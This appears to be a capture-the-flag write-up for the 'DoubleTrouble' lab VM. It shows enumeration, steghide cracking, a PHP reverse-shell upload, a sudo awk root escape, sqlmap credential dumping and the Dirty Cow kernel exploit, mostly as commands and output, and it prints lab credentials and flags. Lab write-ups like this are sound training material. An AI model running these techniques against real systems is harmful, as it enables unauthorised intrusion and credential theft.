@@ -1,1 +1,470 @@
+ENUMERATION
+
+			
+
+---nmap---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.76 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 14:28 +03
+Nmap scan report for 10.0.2.76
+Host is up (0.00082s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
+|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
+|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: qdPM | Login
+MAC Address: 08:00:27:DC:07:7C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.82 ms 10.0.2.76
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 45.88 seconds
+                                                            
+
+
+
+--- when I go to the web address there is a login form, we dont know any credentials yet ---
+
+
+
+--- dirb ---
+
+                                                                               
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.76              
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Jun 23 18:07:48 2024
+URL_BASE: http://10.0.2.76/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.76/ ----
+==> DIRECTORY: http://10.0.2.76/backups/                                                     
+==> DIRECTORY: http://10.0.2.76/batch/                                                       
+==> DIRECTORY: http://10.0.2.76/core/                                                        
+==> DIRECTORY: http://10.0.2.76/css/                                                         
++ http://10.0.2.76/favicon.ico (CODE:200|SIZE:894)                                           
+==> DIRECTORY: http://10.0.2.76/images/                                                      
++ http://10.0.2.76/index.php (CODE:200|SIZE:5804)                                            
+==> DIRECTORY: http://10.0.2.76/install/                                                     
+==> DIRECTORY: http://10.0.2.76/js/                                                          
++ http://10.0.2.76/robots.txt (CODE:200|SIZE:26)                                             
+==> DIRECTORY: http://10.0.2.76/secret/                                                      
++ http://10.0.2.76/server-status (CODE:403|SIZE:274)                                         
+==> DIRECTORY: http://10.0.2.76/sf/                                                          
+==> DIRECTORY: http://10.0.2.76/template/                                                    
+==> DIRECTORY: http://10.0.2.76/uploads/                                                     
+                                               
+                                                                                                                                    
+---- Entering directory: http://10.0.2.76/install/actions/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                             
+---- Entering directory: http://10.0.2.76/install/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                             
+---- Entering directory: http://10.0.2.76/install/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                             
+---- Entering directory: http://10.0.2.76/install/lib/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                             
+---- Entering directory: http://10.0.2.76/install/modules/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Sun Jun 23 18:07:58 2024
+DOWNLOADED: 9224 - FOUND: 5
+                                
+
+
+
+
+
+--- gobuster ---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.76 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php,jpg
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.76
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,jpg
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/images               (Status: 301) [Size: 307] [--> http://10.0.2.76/images/]
+/.php                 (Status: 403) [Size: 274]
+/index.php            (Status: 200) [Size: 5804]
+/uploads              (Status: 301) [Size: 308] [--> http://10.0.2.76/uploads/]
+/css                  (Status: 301) [Size: 304] [--> http://10.0.2.76/css/]
+/template             (Status: 301) [Size: 309] [--> http://10.0.2.76/template/]
+/core                 (Status: 301) [Size: 305] [--> http://10.0.2.76/core/]
+/install              (Status: 301) [Size: 308] [--> http://10.0.2.76/install/]
+/js                   (Status: 301) [Size: 303] [--> http://10.0.2.76/js/]
+/check.php            (Status: 200) [Size: 0]
+/sf                   (Status: 301) [Size: 303] [--> http://10.0.2.76/sf/]
+/readme.txt           (Status: 200) [Size: 470]
+/robots.txt           (Status: 200) [Size: 26]
+/secret               (Status: 301) [Size: 307] [--> http://10.0.2.76/secret/]
+/backups              (Status: 301) [Size: 308] [--> http://10.0.2.76/backups/]
+/batch                (Status: 301) [Size: 306] [--> http://10.0.2.76/batch/]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+
+
+--- readme.txt reveals this ---
+
+
+qdPM
+open source project management software written in symfony framework
+http://qdpm.net
+
+INSTALLATION
+qdPM is web-based application and it means you have to have web-server.
+Simply go to your qdPM web directory and use installer
+
+SUPPORT
+Contact me (support@qdpm.net) if you have any questions, suggestions or feedback about qdPM. 
+My name is Sergey. I always reply to emails within 24-48 hours.
+
+Thanks for downloading and using qdPM open-source solution!
+
+
+
+
+
+--- robots.txt reveals this ---
+
+#User-agent: *
+#Disallow:
+
+
+
+--- we also discover a hidden directory, inside there is a jpg file which shows us a drawing of otis rush ---
+
+
+
+
+--- I decide to check if there is was any data in the jpeg using the stegseek command ---
+
+
+Stegseek: Shows the data in the jpg that was hidden using steghide
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/45- DOUBLETROUBLE LINUX CTF]
+└─# stegseek -wl /home/okina/wordlists/rockyou.txt doubletrouble.jpg 
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "92camaro"       
+[i] Original filename: "creds.txt".
+[i] Extracting to "doubletrouble.jpg.out".
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/45- DOUBLETROUBLE LINUX CTF]
+└─# cat doubletrouble.jpg.out        
+otisrush@localhost.com
+otis666                                                                                              
+
+
+
+--- using these credentials we access the website as otis admin ---
+
+
+
+--- here we are able to upload photos, the website doesn't even check the content of the file so I upload a php file
+and start listening on the port I specified
+
+
+
+--- then I come to the uploads folder, here I see the users folder in it and here is our php file, once we click it,
+we are in ---
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+                                                                                             
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.76] 59528
+Linux doubletrouble 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
+ 11:37:56 up  2:31,  0 users,  load average: 0.14, 0.03, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@doubletrouble:/$ 
+
+
+
+--- here we keep on looking around, let's search for SUID bits ---
+			
+
+www-data@doubletrouble:/home$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on doubletrouble:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on doubletrouble:
+    (ALL : ALL) NOPASSWD: /usr/bin/awk
+www-data@doubletrouble:/home$ sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+# whoami
+whoami
+root
+
+
+
+--- we became root, but there are no flags to be found ---
+
+
+# cd /root
+cd /root
+# ls
+ls
+doubletrouble.ova
+
+
+
+--- turns out the maker of this vm created another machine within this, let's host it to our kali from the reverse shell ---
+
+
+
+# python3 -m http.server
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.0.2.54 - - [23/Jun/2024 11:48:07] "GET /doubletrouble.ova HTTP/1.1" 200 -
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/45- DOUBLETROUBLE LINUX CTF]
+└─# wget http://10.0.2.76:8000/doubletrouble.ova                             
+--2024-06-23 19:48:06--  http://10.0.2.76:8000/doubletrouble.ova
+Connecting to 10.0.2.76:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 413142528 (394M) [application/octet-stream]
+Saving to: ‘doubletrouble.ova’
+
+doubletrouble.ova       100%[=============================>] 394.00M  9.15MB/s    in 30s     
+
+2024-06-23 19:48:36 (13.0 MB/s) - ‘doubletrouble.ova’ saved [413142528/413142528]
+
+                                                                                              
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/45- DOUBLETROUBLE LINUX CTF]
+└─# ls    
+doubletrouble.jpg      doubletrouble.ova
+doubletrouble.jpg.out  doubletrouble_linux_os_ctf_writeup.txt
+                                                                      
+
+
+
+--- I download the new ova file into my computer and then we will perform the same actions on it, this ctf is a pain
+in the ass ---
+
+
+
+--- visiting the 10.0.2.77, the inner vm, we discover a new login page, utilize an sql attack here ---
+
+┌──(root㉿kali)-[/home/okina]
+└─# sqlmap -u 'http://10.0.2.77/index.php' --current-db --forms --crawl=2 --dump
+
+
+
+
+--- we discover the database name doubletroube and table name users ----
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/]
+└─# sqlmap -u 'http://10.0.2.77/index.php' --forms --current-db -D doubletrouble -T users --dump
+
+
+
+--- we retrieve credentials---
+
+
+montreux: GfsZxc1
+
+clapton: ZubZub99
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ssh clapton@10.0.2.77                                                       
+The authenticity of host '10.0.2.77 (10.0.2.77)' can't be established.
+ECDSA key fingerprint is SHA256:/v6Q2+ydqJo0XbOM6QR5qjyuQr2+a/P+R90qw0RlxWI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.77' (ECDSA) to the list of known hosts.
+clapton@10.0.2.77's password: 
+Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+clapton@doubletrouble:~$ ls
+user.txt
+
+clapton@doubletrouble:~$ cat user.txt
+6CEA7A737C7C651F6DA7669109B5FB52
+
+---First User Flag---
+
+
+
+
+--- I check for cronjobs, SUID bits or any executable files but nothing comes up, I check the version of this machine ---
+
+
+uname -a
+Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
+ 
+
+
+
+--- I start searching for ways to exploit this kernel version and find and exploit, Dirty Cow ---
+
+
+--- This exploit effects any system using Linux kernel 2.x through to 4.x before 4.8.3. ---
+
+
+
+I go to the website:
+
+https://github.com/FireFart/dirtycow/blob/master/dirty.c
+
+
+
+--- copy the contents of this exploit and paste it into the empty "exploit.c" file I created ---
+
+
+
+--- now upload it to the target machine ---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop]
+└─# python3 -m http.server
+
+
+
+--- now download it ---
+
+clapton@doubletrouble:~/.ssh$ cd /tmp
+clapton@doubletrouble:/tmp$ wget http://10.0.2.54:8000/exploit.c
+
+
+--- now we compile it ---
+
+clapton@doubletrouble:/tmp$ gcc -pthread exploit.c -o exploit -lcrypt
+
+
+
+
+--- here we give a new password to this new user named firefart ---
+
+
+clapton@doubletrouble:/tmp$ ./exploit new_password
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: root
+Complete line:
+firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash
+
+mmap: 7f1c6bc51000
+
+
+
+
+--- log in as firefart into the ssh server ---
+
+
+
+
+
+
+			PRIVILEGE ESCALATION
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ssh firefart@10.0.2.77
+firefart@10.0.2.77's password: 
+Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Dec 31 18:00:10 1969
+
+firefart@doubletrouble:~# cd /root
+
+firefart@doubletrouble:~# ls
+logdel2  root.txt
+
+firefart@doubletrouble:~# cat root.txt
+1B8EEA89EA92CECB931E3CC25AA8DE21
+
+--- Root User Flag ---
+
+
+
 
